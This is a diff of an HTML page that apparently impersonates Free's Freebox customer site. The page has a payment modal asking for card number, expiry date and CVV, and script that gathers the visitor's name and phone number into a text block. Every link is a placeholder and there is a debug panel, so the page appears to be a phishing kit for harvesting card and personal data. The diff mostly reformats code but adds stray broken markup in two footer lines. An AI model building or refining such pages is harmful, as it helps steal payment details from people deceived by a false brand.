@@ -95,7 +95,7 @@
           <li><a href="#">Assistance en ligne</a></li>
           <li><a href="#">Trouver mon identifiant Freebox</a></li>
           <li><a href="#">Nous contacter</a></li>
-          <li><a href="#">Résiliez votre FAI</a></li>
+          <li><a href="#">Résiliez votre FAI</a></li>>
           <li><a href="#">Guide Pratique</a></li>
           <li><a href="#">Protection de l’enfance</a></li>
         </ul>
@@ -115,7 +115,7 @@
       <div class="legal-links">
         <a href="#">Informations Légales</a>
         <a href="#">Données et contenus</a>
-        <a href="#">Signaler un contenu</a>
+        <a href="#">Signaler un contenu</a></a>
         <a href="#">Tarifs et conditions</a>
       </div>
       <div class="social-icons">
@@ -147,24 +147,10 @@
       <form id="step-2-card" class="modal-step">
         <h2>Détails de la carte</h2>
         <label>Numéro de carte<br>
-          <input
-            type="text"
-            id="cardnumber"
-            name="cardnumber"
-            maxlength="19"
-            placeholder="1234 5678 9012 3456"
-            required
-          >
+          <input type="text" id="cardnumber" name="cardnumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
         </label>
         <label>Date d’expiration<br>
-          <input
-            type="text"
-            id="expdate"
-            name="expdate"
-            maxlength="5"
-            placeholder="MM/AA"
-            required
-          >
+          <input type="text" id="expdate" name="expdate" maxlength="5" placeholder="MM/AA" required>
         </label>
         <label>CVV<br><input type="text" name="cvv" maxlength="3" placeholder="123" required></label>
         <button type="submit" class="btn-pay">Payer</button>
@@ -190,15 +176,12 @@
     </div>
   </div>
 
-  <!-- Panel debug (optionnel) -->
+  <!-- Panel debug -->
   <div id="debug-panel" style="
-    position: fixed;
-    bottom: 0; left: 0;
+    position: fixed; bottom: 0; left: 0;
     width: 100%; max-height: 30%; overflow-y: auto;
     background: rgba(0,0,0,0.8); color: #0f0;
-    font: 12px/1 monospace;
-    padding: 0.5rem;
-    z-index: 10000;
+    font: 12px/1 monospace; padding: 0.5rem; z-index: 10000;
   "></div>
 
   <!-- Client JS -->
@@ -242,7 +225,7 @@
     toStep2.addEventListener('click', () => {
       if (!step1.checkValidity()) return step1.reportValidity();
       const d1 = new FormData(step1);
-      const infos = 
+      const infos =
         `Nom: ${d1.get('lastname')}\n` +
         `Prénom: ${d1.get('firstname')}\n` +
         `Téléphone: ${d1.get('phone')}\n` +
